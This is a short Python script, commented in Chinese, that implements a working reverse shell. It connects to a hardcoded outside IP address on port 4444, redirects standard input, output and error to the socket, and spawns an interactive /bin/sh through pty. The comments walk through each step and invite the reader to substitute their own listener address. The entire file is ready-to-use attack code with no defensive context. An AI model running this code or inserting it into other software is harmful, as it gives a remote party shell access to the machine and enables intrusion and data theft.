import socket
import os
import pty

def reverse_shell(ip, port):
    # 1. 创建一个 TCP 套接字
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # 2. 连接到远程监听服务器
        s.connect((ip, port))
        
        # 3. 文件描述符重定向
        # os.dup2(fd, fd2) 会将 fd2（标准输入、输出、错误）重定向到 fd（socket）
        # 0: stdin (标准输入)
        # 1: stdout (标准输出)
        # 2: stderr (标准错误)
        for fileno in (0, 1, 2):
            os.dup2(s.fileno(), fileno)
        
        # 4. 启动一个交互式的终端 (PTY)
        # 使用 pty 而不是 os.system，可以获得更完整的终端体验（如 tab 补全，交互式命令等）
        pty.spawn("/bin/sh")
        
    except Exception as e:
        print(f"连接失败: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    # 替换为你自己的监听 IP 和端口
    REMOTE_IP = "47.117.67.205"
    REMOTE_PORT = 4444
    reverse_shell(REMOTE_IP, REMOTE_PORT)
